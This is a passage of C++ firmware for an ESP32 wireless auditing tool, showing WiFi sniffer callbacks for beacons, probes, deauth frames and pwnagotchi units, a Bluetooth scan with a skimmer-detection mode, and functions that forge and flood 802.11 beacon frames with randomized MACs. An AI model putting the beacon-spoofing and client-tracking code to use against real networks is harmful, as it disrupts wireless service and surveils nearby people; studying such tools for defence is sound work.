    display_obj.TOP_FIXED_AREA_2 = 48;
    display_obj.tteBar = true;
    display_obj.print_delay_1 = 15;
    display_obj.print_delay_2 = 10;
    display_obj.initScrollValues(true);
    display_obj.tft.setTextWrap(false);
    display_obj.tft.setTextColor(TFT_BLACK, color);
    display_obj.tft.fillRect(0,16,240,16, color);
    display_obj.tft.drawCentreString(text_table4[40],120,16,2);
    display_obj.touchToExit();
    display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
    display_obj.setupScrollArea(display_obj.TOP_FIXED_AREA_2, BOT_FIXED_AREA);
  #endif
  
  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_NULL);
  esp_wifi_start();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_filter(&filt);
  esp_wifi_set_promiscuous_rx_cb(&probeSnifferCallback);
  esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
  this->wifi_initialized = true;
  initTime = millis();
}

// Function to start running any BLE scan
void WiFiScan::RunBluetoothScan(uint8_t scan_mode, uint16_t color)
{
  #ifdef HAS_BT
    #ifdef HAS_SCREEN
      display_obj.print_delay_1 = 50;
      display_obj.print_delay_2 = 20;
    #endif
  
    NimBLEDevice::setScanFilterMode(CONFIG_BTDM_SCAN_DUPL_TYPE_DEVICE);
    NimBLEDevice::setScanDuplicateCacheSize(200);
    NimBLEDevice::init("");
    pBLEScan = NimBLEDevice::getScan(); //create new scan
    if (scan_mode == BT_SCAN_ALL)
    {
      #ifdef HAS_SCREEN
        display_obj.TOP_FIXED_AREA_2 = 48;
        display_obj.tteBar = true;
        display_obj.initScrollValues(true);
        display_obj.tft.setTextWrap(false);
        display_obj.tft.setTextColor(TFT_BLACK, color);
        display_obj.tft.fillRect(0,16,240,16, color);
        display_obj.tft.drawCentreString(text_table4[41],120,16,2);
        display_obj.touchToExit();
        display_obj.tft.setTextColor(TFT_CYAN, TFT_BLACK);
        display_obj.setupScrollArea(display_obj.TOP_FIXED_AREA_2, BOT_FIXED_AREA);
      #endif
      pBLEScan->setAdvertisedDeviceCallbacks(new bluetoothScanAllCallback(), false);
    }
    else if (scan_mode == BT_SCAN_SKIMMERS)
    {
      #ifdef HAS_SCREEN
        display_obj.TOP_FIXED_AREA_2 = 160;
        display_obj.tteBar = true;
        display_obj.tft.fillScreen(TFT_DARKGREY);
        display_obj.initScrollValues(true);
        display_obj.tft.setTextWrap(false);
        display_obj.tft.setTextColor(TFT_BLACK, color);
        display_obj.tft.fillRect(0,16,240,16, color);
        display_obj.tft.drawCentreString(text_table4[42],120,16,2);
        display_obj.twoPartDisplay(text_table4[43]);
        display_obj.tft.setTextColor(TFT_BLACK, TFT_DARKGREY);
        display_obj.setupScrollArea(display_obj.TOP_FIXED_AREA_2, BOT_FIXED_AREA);
      #endif
      pBLEScan->setAdvertisedDeviceCallbacks(new bluetoothScanSkimmersCallback(), false);
    }
    pBLEScan->setActiveScan(true); //active scan uses more power, but get results faster
    pBLEScan->setInterval(97);
    pBLEScan->setWindow(37);  // less or equal setInterval value
    pBLEScan->setMaxResults(0);
    pBLEScan->start(0, scanCompleteCB, false);
    Serial.println("Started BLE Scan");
    this->ble_initialized = true;
    initTime = millis();
  #endif
}

// Function that is called when BLE scan is completed
#ifdef HAS_BT
  void WiFiScan::scanCompleteCB(BLEScanResults scanResults) {
    printf("Scan complete!\n");
    printf("Found %d devices\n", scanResults.getCount());
    scanResults.dump();
  } // scanCompleteCB
#endif


// Function to extract MAC addr from a packet at given offset
void WiFiScan::getMAC(char *addr, uint8_t* data, uint16_t offset) {
  sprintf(addr, "%02x:%02x:%02x:%02x:%02x:%02x", data[offset+0], data[offset+1], data[offset+2], data[offset+3], data[offset+4], data[offset+5]);
}

void WiFiScan::espressifSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type)
{
  bool save_packet = settings_obj.loadSetting<bool>(text_table4[7]);
  
  wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
  WifiMgmtHdr *frameControl = (WifiMgmtHdr*)snifferPacket->payload;
  wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)snifferPacket->rx_ctrl;
  int len = snifferPacket->rx_ctrl.sig_len;

  String display_string = "";
  String src_addr_string = "";

  if (type == WIFI_PKT_MGMT)
  {
    len -= 4;
  }
  int fctl = ntohs(frameControl->fctl);
  const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)snifferPacket->payload;
  const WifiMgmtHdr *hdr = &ipkt->hdr;

  // If we dont the buffer size is not 0, don't write or else we get CORRUPT_HEAP
  //if ((snifferPacket->payload[0] == 0x80) && (display_obj.display_buffer->size() == 0))
  //{

  char addr[] = "00:00:00:00:00:00";
  getMAC(addr, snifferPacket->payload, 10);

  src_addr_string.concat(addr);
  bool match = false;

  for (int i = 0; i < (sizeof(espressif_macs) / sizeof(espressif_macs[0])); i++) {
    if (src_addr_string.startsWith(espressif_macs[i])) {
      match = true;
      break;
    }
  }
  
  if (!match)
    return;

  delay(random(0, 10));
  Serial.print("RSSI: ");
  Serial.print(snifferPacket->rx_ctrl.rssi);
  Serial.print(" Ch: ");
  Serial.print(snifferPacket->rx_ctrl.channel);
  Serial.print(" BSSID: ");
    
  Serial.print(addr);
  //display_string.concat(" RSSI: ");
  //display_string.concat(snifferPacket->rx_ctrl.rssi);
  display_string.concat("CH: " + (String)snifferPacket->rx_ctrl.channel);

  //display_string.concat(" ");
  display_string.concat(" -> ");
  display_string.concat(addr);

  for (int i = 0; i < 19 - snifferPacket->payload[37]; i++)
  {
    display_string.concat(" ");
  }

  Serial.print(" ");

  #ifdef HAS_SCREEN
    display_obj.loading = true;
    display_obj.display_buffer->add(display_string);
    display_obj.loading = false;
  #endif
  

  
  Serial.println();

  if (save_packet)
    sd_obj.addPacket(snifferPacket->payload, len);
  //}
}

void WiFiScan::pwnSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type)
{
  bool save_packet = settings_obj.loadSetting<bool>(text_table4[7]);
  
  wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
  WifiMgmtHdr *frameControl = (WifiMgmtHdr*)snifferPacket->payload;
  wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)snifferPacket->rx_ctrl;
  int len = snifferPacket->rx_ctrl.sig_len;

  String display_string = "";
  String src = "";
  String essid = "";

  if (type == WIFI_PKT_MGMT)
  {
    len -= 4;
    int fctl = ntohs(frameControl->fctl);
    const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)snifferPacket->payload;
    const WifiMgmtHdr *hdr = &ipkt->hdr;

    // If we dont the buffer size is not 0, don't write or else we get CORRUPT_HEAP
    #ifdef HAS_SCREEN
      int buf = display_obj.display_buffer->size();
    #else
      int buf = 0;
    #endif
    
    if ((snifferPacket->payload[0] == 0x80) && (buf == 0))
    {
      char addr[] = "00:00:00:00:00:00";
      getMAC(addr, snifferPacket->payload, 10);
      src.concat(addr);
      if (src == "de:ad:be:ef:de:ad") {
        
        
        delay(random(0, 10));
        Serial.print("RSSI: ");
        Serial.print(snifferPacket->rx_ctrl.rssi);
        Serial.print(" Ch: ");
        Serial.print(snifferPacket->rx_ctrl.channel);
        Serial.print(" BSSID: ");
        Serial.print(addr);
        //display_string.concat(addr);
        display_string.concat("CH: " + (String)snifferPacket->rx_ctrl.channel);
        Serial.print(" ESSID: ");
        display_string.concat(" -> ");

        // Just grab the first 255 bytes of the pwnagotchi beacon
        // because that is where the name is
        //for (int i = 0; i < snifferPacket->payload[37]; i++)
        for (int i = 0; i < len - 37; i++)
        {
          Serial.print((char)snifferPacket->payload[i + 38]);
          //display_string.concat((char)snifferPacket->payload[i + 38]);
          if (isAscii(snifferPacket->payload[i + 38]))
            essid.concat((char)snifferPacket->payload[i + 38]);
          else
            Serial.println("Got non-ascii character: " + (String)(char)snifferPacket->payload[i + 38]);
        }
        //essid.concat("\": \"\"}}");
        //Serial.println("\n" + (String)(snifferPacket->payload[37]) + " -> " + essid);

        // Load json
        //DynamicJsonBuffer jsonBuffer; // ArduinoJson v5
        DynamicJsonDocument json(1024); // ArduinoJson v6
        //JsonObject& json = jsonBuffer.parseObject(essid); // ArduinoJson v5
         // ArduinoJson v6
        if (deserializeJson(json, essid)) {
          Serial.println("\nCould not parse Pwnagotchi json");
          display_string.concat(essid);
        }
        else {
          Serial.println("\nSuccessfully parsed json");
          String json_output;
          //json.printTo(json_output); // ArduinoJson v5
          serializeJson(json, json_output); // ArduinoJson v6
          Serial.println(json_output);
          display_string.concat(json["name"].as<String>() + " pwnd: " + json["pwnd_tot"].as<String>());
        }
  
        int temp_len = display_string.length();
        for (int i = 0; i < 40 - temp_len; i++)
        {
          display_string.concat(" ");
        }
  
        Serial.print(" ");

        #ifdef HAS_SCREEN
          if (display_obj.display_buffer->size() == 0)
          {
            display_obj.loading = true;
            display_obj.display_buffer->add(display_string);
            display_obj.loading = false;
          }
        #endif
        
  
        
        Serial.println();

        if (save_packet)
          sd_obj.addPacket(snifferPacket->payload, len);
      }
    }
  }
}

void WiFiScan::apSnifferCallbackFull(void* buf, wifi_promiscuous_pkt_type_t type) {
  bool save_packet = settings_obj.loadSetting<bool>(text_table4[7]);
  
  wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
  WifiMgmtHdr *frameControl = (WifiMgmtHdr*)snifferPacket->payload;
  wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)snifferPacket->rx_ctrl;
  int len = snifferPacket->rx_ctrl.sig_len;

  String display_string = "";
  String essid = "";
  String bssid = "";

  if (type == WIFI_PKT_MGMT)
  {
    len -= 4;
    int fctl = ntohs(frameControl->fctl);
    const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)snifferPacket->payload;
    const WifiMgmtHdr *hdr = &ipkt->hdr;

    // If we dont the buffer size is not 0, don't write or else we get CORRUPT_HEAP
    #ifdef HAS_SCREEN
      int buf = display_obj.display_buffer->size();
    #else
      int buf = 0;
    #endif
    if ((snifferPacket->payload[0] == 0x80) && (buf == 0))
    {
      char addr[] = "00:00:00:00:00:00";
      getMAC(addr, snifferPacket->payload, 10);

      bool in_list = false;
      bool mac_match = true;

      for (int i = 0; i < access_points->size(); i++) {
        mac_match = true;
        //Serial.print("Checking ");
        //Serial.print(addr);
        //Serial.println(" against " + (String)access_points->get(i).essid);

        
        for (int x = 0; x < 6; x++) {
          //Serial.println((String)snifferPacket->payload[x + 10] + " | " + (String)access_points->get(i).bssid[x]);
          if (snifferPacket->payload[x + 10] != access_points->get(i).bssid[x]) {
            mac_match = false;
            //Serial.println("MACs do not match");
            break;
          }
        }
        if (mac_match) {
          in_list = true;
          break;
        }
      }

      if (!in_list) {
      
        delay(random(0, 10));
        Serial.print("RSSI: ");
        Serial.print(snifferPacket->rx_ctrl.rssi);
        Serial.print(" Ch: ");
        Serial.print(snifferPacket->rx_ctrl.channel);
        Serial.print(" BSSID: ");
        Serial.print(addr);
        display_string.concat(addr);
        Serial.print(" ESSID: ");
        display_string.concat(" -> ");
        for (int i = 0; i < snifferPacket->payload[37]; i++)
        {
          Serial.print((char)snifferPacket->payload[i + 38]);
          display_string.concat((char)snifferPacket->payload[i + 38]);
          essid.concat((char)snifferPacket->payload[i + 38]);

          
        }

        bssid.concat(addr);
  
        int temp_len = display_string.length();
        for (int i = 0; i < 40 - temp_len; i++)
        {
          display_string.concat(" ");
        }
  
        Serial.print(" ");

        #ifdef HAS_SCREEN
          if (display_obj.display_buffer->size() == 0)
          {
            display_obj.loading = true;
            display_obj.display_buffer->add(display_string);
            display_obj.loading = false;
          }
        #endif
        
        if (essid == "") {
          essid = bssid;
          Serial.print(essid + " ");
        }

        //LinkedList<char> beacon = new LinkedList<char>();
        
        /*AccessPoint ap = {essid,
                          snifferPacket->rx_ctrl.channel,
                          {snifferPacket->payload[10],
                           snifferPacket->payload[11],
                           snifferPacket->payload[12],
                           snifferPacket->payload[13],
                           snifferPacket->payload[14],
                           snifferPacket->payload[15]},
                          false,
                          NULL};*/

        AccessPoint ap;
        ap.essid = essid;
        ap.channel = snifferPacket->rx_ctrl.channel;
        ap.bssid[0] = snifferPacket->payload[10];
        ap.bssid[1] = snifferPacket->payload[11];
        ap.bssid[2] = snifferPacket->payload[12];
        ap.bssid[3] = snifferPacket->payload[13];
        ap.bssid[4] = snifferPacket->payload[14];
        ap.bssid[5] = snifferPacket->payload[15];
        ap.selected = false;
        
        ap.beacon = new LinkedList<char>();

        for (int i = 0; i < len; i++) {
          ap.beacon->add(snifferPacket->payload[i]);
        }

        //Serial.println("\nBeacon: ");

        /*for (int i = 0; i < len; i++) {
          char hexCar[4];
          sprintf(hexCar, "%02X", ap.beacon->get(i));
          Serial.print(hexCar);
          if ((i + 1) % 16 == 0)
            Serial.print("\n");
          else
            Serial.print(" ");
        }*/

        access_points->add(ap);

        Serial.print(access_points->size());

        Serial.println();

        if (save_packet)
          sd_obj.addPacket(snifferPacket->payload, len);
      }
    }
  }
}

void WiFiScan::apSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type)
{
  bool save_packet = settings_obj.loadSetting<bool>(text_table4[7]);
  
  wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
  WifiMgmtHdr *frameControl = (WifiMgmtHdr*)snifferPacket->payload;
  wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)snifferPacket->rx_ctrl;
  int len = snifferPacket->rx_ctrl.sig_len;

  String display_string = "";
  String essid = "";
  String bssid = "";

  if (type == WIFI_PKT_MGMT)
  {
    len -= 4;
    int fctl = ntohs(frameControl->fctl);
    const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)snifferPacket->payload;
    const WifiMgmtHdr *hdr = &ipkt->hdr;

    // If we dont the buffer size is not 0, don't write or else we get CORRUPT_HEAP
    #ifdef HAS_SCREEN
      int buf = display_obj.display_buffer->size();
    #else
      int buf = 0;
    #endif
    if ((snifferPacket->payload[0] == 0x80) && (buf == 0))
    {
      char addr[] = "00:00:00:00:00:00";
      getMAC(addr, snifferPacket->payload, 10);

      bool in_list = false;
      bool mac_match = true;

      for (int i = 0; i < access_points->size(); i++) {
        mac_match = true;
        //Serial.print("Checking ");
        //Serial.print(addr);
        //Serial.println(" against " + (String)access_points->get(i).essid);

        
        for (int x = 0; x < 6; x++) {
          //Serial.println((String)snifferPacket->payload[x + 10] + " | " + (String)access_points->get(i).bssid[x]);
          if (snifferPacket->payload[x + 10] != access_points->get(i).bssid[x]) {
            mac_match = false;
            //Serial.println("MACs do not match");
            break;
          }
        }
        if (mac_match) {
          in_list = true;
          break;
        }
      }

      if (!in_list) {
      
        delay(random(0, 10));
        Serial.print("RSSI: ");
        Serial.print(snifferPacket->rx_ctrl.rssi);
        Serial.print(" Ch: ");
        Serial.print(snifferPacket->rx_ctrl.channel);
        Serial.print(" BSSID: ");
        Serial.print(addr);
        display_string.concat(addr);
        Serial.print(" ESSID: ");
        display_string.concat(" -> ");
        for (int i = 0; i < snifferPacket->payload[37]; i++)
        {
          Serial.print((char)snifferPacket->payload[i + 38]);
          display_string.concat((char)snifferPacket->payload[i + 38]);
          essid.concat((char)snifferPacket->payload[i + 38]);

          
        }

        bssid.concat(addr);
  
        int temp_len = display_string.length();
        for (int i = 0; i < 40 - temp_len; i++)
        {
          display_string.concat(" ");
        }
  
        Serial.print(" ");

        #ifdef HAS_SCREEN
          if (display_obj.display_buffer->size() == 0)
          {
            display_obj.loading = true;
            display_obj.display_buffer->add(display_string);
            display_obj.loading = false;
          }
        #endif
        
        if (essid == "") {
          essid = bssid;
          Serial.print(essid + " ");
        }
        
        AccessPoint ap = {essid,
                          snifferPacket->rx_ctrl.channel,
                          {snifferPacket->payload[10],
                           snifferPacket->payload[11],
                           snifferPacket->payload[12],
                           snifferPacket->payload[13],
                           snifferPacket->payload[14],
                           snifferPacket->payload[15]},
                          false,
                          NULL};


        access_points->add(ap);

        Serial.print(access_points->size());

        Serial.println();

        if (save_packet)
          sd_obj.addPacket(snifferPacket->payload, len);
      }
    }
  }
}

void WiFiScan::beaconSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type)
{
  bool save_packet = settings_obj.loadSetting<bool>(text_table4[7]);
  
  wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
  WifiMgmtHdr *frameControl = (WifiMgmtHdr*)snifferPacket->payload;
  wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)snifferPacket->rx_ctrl;
  int len = snifferPacket->rx_ctrl.sig_len;

  String display_string = "";

  if (type == WIFI_PKT_MGMT)
  {
    len -= 4;
    int fctl = ntohs(frameControl->fctl);
    const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)snifferPacket->payload;
    const WifiMgmtHdr *hdr = &ipkt->hdr;

    // If we dont the buffer size is not 0, don't write or else we get CORRUPT_HEAP
    #ifdef HAS_SCREEN
      int buf = display_obj.display_buffer->size();
    #else
      int buf = 0;
    #endif
    if ((snifferPacket->payload[0] == 0x80) && (buf == 0))
    {
      delay(random(0, 10));
      Serial.print("RSSI: ");
      Serial.print(snifferPacket->rx_ctrl.rssi);
      Serial.print(" Ch: ");
      Serial.print(snifferPacket->rx_ctrl.channel);
      Serial.print(" BSSID: ");
      char addr[] = "00:00:00:00:00:00";
      getMAC(addr, snifferPacket->payload, 10);
      Serial.print(addr);
      display_string.concat(addr);
      Serial.print(" ESSID: ");
      display_string.concat(" -> ");
      for (int i = 0; i < snifferPacket->payload[37]; i++)
      {
        Serial.print((char)snifferPacket->payload[i + 38]);
        display_string.concat((char)snifferPacket->payload[i + 38]);
      }

      int temp_len = display_string.length();

      #ifdef HAS_SCREEN
        for (int i = 0; i < 40 - temp_len; i++)
        {
          display_string.concat(" ");
        }
  
        Serial.print(" ");
  
        if (display_obj.display_buffer->size() == 0)
        {
          display_obj.loading = true;
          display_obj.display_buffer->add(display_string);
          display_obj.loading = false;
        }
      #endif
      

      
      Serial.println();

      if (save_packet)
        sd_obj.addPacket(snifferPacket->payload, len);
    }
  }
}

void WiFiScan::deauthSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type)
{
  bool save_packet = settings_obj.loadSetting<bool>(text_table4[7]);
  
  wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
  WifiMgmtHdr *frameControl = (WifiMgmtHdr*)snifferPacket->payload;
  wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)snifferPacket->rx_ctrl;
  int len = snifferPacket->rx_ctrl.sig_len;

  String display_string = "";

  if (type == WIFI_PKT_MGMT)
  {
    len -= 4;
    int fctl = ntohs(frameControl->fctl);
    const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)snifferPacket->payload;
    const WifiMgmtHdr *hdr = &ipkt->hdr;

    // If we dont the buffer size is not 0, don't write or else we get CORRUPT_HEAP
    #ifdef HAS_SCREEN
      int buf = display_obj.display_buffer->size();
    #else
      int buf = 0;
    #endif
    if ((snifferPacket->payload[0] == 0xA0 || snifferPacket->payload[0] == 0xC0 ) && (buf == 0))
    {
      delay(random(0, 10));
      Serial.print("RSSI: ");
      Serial.print(snifferPacket->rx_ctrl.rssi);
      Serial.print(" Ch: ");
      Serial.print(snifferPacket->rx_ctrl.channel);
      Serial.print(" BSSID: ");
      char addr[] = "00:00:00:00:00:00";
      getMAC(addr, snifferPacket->payload, 10);
      Serial.print(addr);
      display_string.concat(text_table4[0]);
      display_string.concat(snifferPacket->rx_ctrl.rssi);

      display_string.concat(" ");
      display_string.concat(addr);

      #ifdef HAS_SCREEN
        for (int i = 0; i < 19 - snifferPacket->payload[37]; i++)
        {
          display_string.concat(" ");
        }
  
        Serial.print(" ");
  
        if (display_obj.display_buffer->size() == 0)
        {
          display_obj.loading = true;
          display_obj.display_buffer->add(display_string);
          display_obj.loading = false;
        }
      #endif
      
      Serial.println();

      if (save_packet)
        sd_obj.addPacket(snifferPacket->payload, len);
    }
  }
}

void WiFiScan::probeSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  bool save_packet = settings_obj.loadSetting<bool>(text_table4[7]);
  
  wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
  WifiMgmtHdr *frameControl = (WifiMgmtHdr*)snifferPacket->payload;
  wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)snifferPacket->rx_ctrl;
  int len = snifferPacket->rx_ctrl.sig_len;

  String display_string = "";

  if (type == WIFI_PKT_MGMT)
  {
    len -= 4;
    int fctl = ntohs(frameControl->fctl);
    const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)snifferPacket->payload;
    const WifiMgmtHdr *hdr = &ipkt->hdr;


    // If we dont the buffer size is not 0, don't write or else we get CORRUPT_HEAP
    #ifdef HAS_SCREEN
      int buf = display_obj.display_buffer->size();
    #else
      int buf = 0;
    #endif
    if ((snifferPacket->payload[0] == 0x40) && (buf == 0))
    {
      delay(random(0, 10));
      Serial.print("RSSI: ");
      Serial.print(snifferPacket->rx_ctrl.rssi);
      Serial.print(" Ch: ");
      Serial.print(snifferPacket->rx_ctrl.channel);
      Serial.print(" Client: ");
      char addr[] = "00:00:00:00:00:00";
      getMAC(addr, snifferPacket->payload, 10);
      Serial.print(addr);
      display_string.concat(addr);
      Serial.print(" Requesting: ");
      display_string.concat(" -> ");
      for (int i = 0; i < snifferPacket->payload[25]; i++)
      {
        Serial.print((char)snifferPacket->payload[26 + i]);
        display_string.concat((char)snifferPacket->payload[26 + i]);
      }

      // Print spaces because of the rotating lines of the hardware scroll.
      // The same characters print from previous lines so I just overwrite them
      // with spaces.
      #ifdef HAS_SCREEN
        for (int i = 0; i < 19 - snifferPacket->payload[25]; i++)
        {
          display_string.concat(" ");
        }
  
        if (display_obj.display_buffer->size() == 0)
        {
          //while (display_obj.printing)
          //  delay(1);
          display_obj.loading = true;
          display_obj.display_buffer->add(display_string);
          display_obj.loading = false;
        }
      #endif
      
      Serial.println();    

      if (save_packet)
        sd_obj.addPacket(snifferPacket->payload, len);
    }
  }
}

void WiFiScan::beaconListSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  bool save_packet = settings_obj.loadSetting<bool>(text_table4[7]);
  
  wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
  WifiMgmtHdr *frameControl = (WifiMgmtHdr*)snifferPacket->payload;
  wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)snifferPacket->rx_ctrl;
  int len = snifferPacket->rx_ctrl.sig_len;

  String display_string = "";
  String essid = "";
  bool found = false;

  if (type == WIFI_PKT_MGMT)
  {
    len -= 4;
    int fctl = ntohs(frameControl->fctl);
    const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)snifferPacket->payload;
    const WifiMgmtHdr *hdr = &ipkt->hdr;


    // If we dont the buffer size is not 0, don't write or else we get CORRUPT_HEAP
    #ifdef HAS_SCREEN
      int buf = display_obj.display_buffer->size();
    #else
      int buf = 0;
    #endif
    if ((snifferPacket->payload[0] == 0x40) && (buf == 0))
    {

      for (uint8_t i = 0; i < snifferPacket->payload[25]; i++)
      {
        essid.concat((char)snifferPacket->payload[26 + i]);
      }

      for (int i = 0; i < ssids->size(); i++) {
        if (ssids->get(i).essid == essid) {
          Serial.println("Found a sheep");
          found = true;
          break;
        }
      }

      if (!found)
        return;
      
      delay(random(0, 10));
      Serial.print("RSSI: ");
      Serial.print(snifferPacket->rx_ctrl.rssi);
      Serial.print(" Ch: ");
      Serial.print(snifferPacket->rx_ctrl.channel);
      Serial.print(" Client: ");
      char addr[] = "00:00:00:00:00:00";
      getMAC(addr, snifferPacket->payload, 10);
      Serial.print(addr);
      display_string.concat(addr);
      Serial.print(" Requesting: ");
      display_string.concat(" -> ");

      // ESSID
      for (int i = 0; i < snifferPacket->payload[25]; i++)
      {
        Serial.print((char)snifferPacket->payload[26 + i]);
        display_string.concat((char)snifferPacket->payload[26 + i]);
      }

      // Print spaces because of the rotating lines of the hardware scroll.
      // The same characters print from previous lines so I just overwrite them
      // with spaces.
      #ifdef HAS_SCREEN
        for (int i = 0; i < 19 - snifferPacket->payload[25]; i++)
        {
          display_string.concat(" ");
        }
  
        if (display_obj.display_buffer->size() == 0)
        {
          display_obj.loading = true;
          display_obj.display_buffer->add(display_string);
          display_obj.loading = false;
        }
      #endif
      
      Serial.println();    

      if (save_packet)
        sd_obj.addPacket(snifferPacket->payload, len);
    }
  }
}

/*
void WiFiScan::broadcastAPBeacon(uint32_t currentTime, AccessPoint custom_ssid) {
  set_channel = random(1,12); 
  esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
  delay(1);

  // Randomize SRC MAC
  packet[10] = packet[16] = custom_ssid.bssid[0];
  packet[11] = packet[17] = custom_ssid.bssid[1];
  packet[12] = packet[18] = custom_ssid.bssid[2];
  packet[13] = packet[19] = custom_ssid.bssid[3];
  packet[14] = packet[20] = custom_ssid.bssid[4];
  packet[15] = packet[21] = custom_ssid.bssid[5];

  char ESSID[custom_ssid.essid.length() + 1] = {};
  custom_ssid.essid.toCharArray(ESSID, custom_ssid.essid.length() + 1);
}*/

void WiFiScan::broadcastCustomBeacon(uint32_t current_time, AccessPoint custom_ssid) {
  set_channel = random(1,12); 
  esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
  delay(1);  

  if (custom_ssid.beacon->size() == 0)
    return;

  uint8_t new_packet[custom_ssid.beacon->size()];

  for (int i = 0; i < custom_ssid.beacon->size(); i++) {
    new_packet[i] = custom_ssid.beacon->get(i);
  }

  // Randomize SRC MAC
  new_packet[10] = new_packet[16] = random(256);
  new_packet[11] = new_packet[17] = random(256);
  new_packet[12] = new_packet[18] = random(256);
  new_packet[13] = new_packet[19] = random(256);
  new_packet[14] = new_packet[20] = random(256);
  new_packet[15] = new_packet[21] = random(256);

  //char ESSID[custom_ssid.essid.length() + 1] = {};
  //custom_ssid.essid.toCharArray(ESSID, custom_ssid.essid.length() + 1);

  //int ssidLen = strlen(ESSID);
  //int rand_len = sizeof(rand_reg);
  //int fullLen = ssidLen;
  //new_packet[37] = fullLen;

  // Insert my tag
  //for(int i = 0; i < ssidLen; i++)
  //  new_packet[38 + i] = ESSID[i];

  /////////////////////////////
  
  //new_packet[50 + fullLen] = set_channel;

  //uint8_t postSSID[13] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, //supported rate
  //                    0x03, 0x01, 0x04 /*DSSS (Current Channel)*/ };



  // Add everything that goes after the SSID
  //for(int i = 0; i < 12; i++) 
  //  packet[38 + fullLen + i] = postSSID[i];
  

  esp_wifi_80211_tx(WIFI_IF_AP, new_packet, sizeof(new_packet), false);
  esp_wifi_80211_tx(WIFI_IF_AP, new_packet, sizeof(new_packet), false);
  esp_wifi_80211_tx(WIFI_IF_AP, new_packet, sizeof(new_packet), false);

  packets_sent = packets_sent + 3;
}

void WiFiScan::broadcastCustomBeacon(uint32_t current_time, ssid custom_ssid) {
  set_channel = random(1,12); 
  esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
  delay(1);  

  // Randomize SRC MAC
  packet[10] = packet[16] = custom_ssid.bssid[0];
  packet[11] = packet[17] = custom_ssid.bssid[1];
  packet[12] = packet[18] = custom_ssid.bssid[2];
  packet[13] = packet[19] = custom_ssid.bssid[3];
  packet[14] = packet[20] = custom_ssid.bssid[4];
  packet[15] = packet[21] = custom_ssid.bssid[5];

  char ESSID[custom_ssid.essid.length() + 1] = {};
  custom_ssid.essid.toCharArray(ESSID, custom_ssid.essid.length() + 1);

  int ssidLen = strlen(ESSID);
  //int rand_len = sizeof(rand_reg);
  int fullLen = ssidLen;
  packet[37] = fullLen;

  // Insert my tag
  for(int i = 0; i < ssidLen; i++)
    packet[38 + i] = ESSID[i];

  /////////////////////////////
  
  packet[50 + fullLen] = set_channel;

  uint8_t postSSID[13] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, //supported rate
                      0x03, 0x01, 0x04 /*DSSS (Current Channel)*/ };



  // Add everything that goes after the SSID
  for(int i = 0; i < 12; i++) 
    packet[38 + fullLen + i] = postSSID[i];
  

  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);

  packets_sent = packets_sent + 3;
}

// Function to send beacons with random ESSID length
void WiFiScan::broadcastSetSSID(uint32_t current_time, char* ESSID) {
  set_channel = random(1,12); 
  esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
  delay(1);  

  // Randomize SRC MAC
  packet[10] = packet[16] = random(256);
  packet[11] = packet[17] = random(256);
  packet[12] = packet[18] = random(256);
  packet[13] = packet[19] = random(256);
  packet[14] = packet[20] = random(256);
  packet[15] = packet[21] = random(256);

  int ssidLen = strlen(ESSID);
  //int rand_len = sizeof(rand_reg);
  int fullLen = ssidLen;
  packet[37] = fullLen;

  // Insert my tag
  for(int i = 0; i < ssidLen; i++)
    packet[38 + i] = ESSID[i];

  /////////////////////////////
  
  packet[50 + fullLen] = set_channel;

